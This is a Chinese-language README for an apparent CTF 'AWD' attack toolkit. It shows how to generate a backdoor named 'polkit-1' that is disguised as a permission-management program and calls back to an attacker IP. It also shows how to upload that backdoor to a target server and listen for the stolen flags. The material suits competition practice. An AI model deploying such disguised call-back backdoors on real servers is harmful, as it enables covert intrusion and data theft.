# 欢迎使用AWD工具箱

由ZLL开发，专打比赛用

## 安装

环境要求：linux内核，使用python3.8及以上版本，不需要安装额外的库

## 启动

使用以下命令激活程序

```shellsession
python3 main.py
```

正确运行后，会显示

```shellsession
Welcome to AWD_toolkits.
Made by VioLina


Enter the corresponding number to use the function:
1. Activate port handler
2. Generate Backdoor program
3. Generate Backdoor script
4. Exit
```

## 生成后门程序

使用功能2

输入端口号（此处示例为1111）

输入回连ip地址（此处示例为111.111.111.111）

```shellsession
Enter the corresponding number to use the function:
1. Activate port handler
2. Generate Backdoor program
3. Generate Backdoor script
4. Exit

2
Please input port number:1111
Please input ip address(xxx.xxx.xxx.xxx):111.111.111.111
```

而后会在目录下生成名为polkit-1的后门程序（假装是权限管理程序）

## 监听端口获取flag

将后门程序上传至目标服务器并运行，而后在攻击机上开启功能1，这样就会自动监听端口了

```shellsession

Enter the corresponding number to use the function:
1. Activate port handler
2. Generate Backdoor program
3. Generate Backdoor script
4. Exit

1
Please input port number:1111
Listening on 0.0.0.0:1111...
Received: flag{test1}

```
